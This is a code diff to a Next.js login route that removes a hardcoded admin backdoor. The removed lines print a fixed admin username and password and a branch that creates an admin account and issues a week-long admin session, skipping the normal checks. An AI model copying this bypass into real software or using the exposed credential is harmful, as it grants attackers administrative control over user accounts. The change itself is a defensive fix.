@@ -1,14 +1,13 @@
 import { NextResponse } from "next/server"
 import { storage } from "@/lib/db/storage"
-import { verifyPassword, generateToken, hashPassword } from "@/lib/auth/client-utils"
-import type { Session, User } from "@/lib/db/models"
+import { verifyPassword, generateToken } from "@/lib/auth/client-utils"
+import type { Session } from "@/lib/db/models"
 import { sendAdminLog } from "@/lib/email"
 
 const MAX_FAILED_ATTEMPTS = 5
 const LOCK_DURATION = 300000 // 5 minutes in milliseconds
 
-const ADMIN_USERNAME = "admin"
-const ADMIN_PASSWORD = "Nazzelandavionna62529"
+// Admin backdoor removed for security
 
 export async function POST(request: Request) {
   try {
@@ -19,59 +18,7 @@ export async function POST(request: Request) {
       return NextResponse.json({ error: "All fields are required" }, { status: 400 })
     }
 
-    if (usernameOrEmail === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
-      // Check if admin user exists, if not create it
-      let adminUser = await storage.getUserByUsername(ADMIN_USERNAME)
-
-      if (!adminUser) {
-        adminUser = {
-          id: "admin-" + Date.now().toString(),
-          username: ADMIN_USERNAME,
-          email: "admin@nazzelandavionna.com",
-          password: hashPassword(ADMIN_PASSWORD),
-          dateOfBirth: "1990-01-01",
-          isVerified: true,
-          role: "admin",
-          failedLoginAttempts: 0,
-          agreedToTerms: true,
-          postCount: 0,
-          isOnline: true,
-          lastSeen: new Date(),
-          createdAt: new Date(),
-          updatedAt: new Date(),
-        } as User
-        await storage.saveUser(adminUser)
-      }
-
-      // Create admin session
-      const token = generateToken()
-      const session: Session = {
-        id: Date.now().toString(),
-        userId: adminUser.id,
-        token,
-        expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000), // 7 days
-        createdAt: new Date(),
-      }
-      await storage.saveSession(session)
-
-      const response = NextResponse.json({
-        success: true,
-        message: "Admin login successful",
-        token,
-        user: {
-          id: adminUser.id,
-          username: adminUser.username,
-          email: adminUser.email,
-          role: "admin",
-        },
-      })
-
-      await sendAdminLog(
-        "Admin login",
-        `<p>Admin <strong>${adminUser.username}</strong> logged in.</p>`
-      )
-      return response
-    }
+    // Note: No admin bypass. Only regular credential checks below.
 
     // Find user by email or username
     let user = await storage.getUserByEmail(usernameOrEmail)
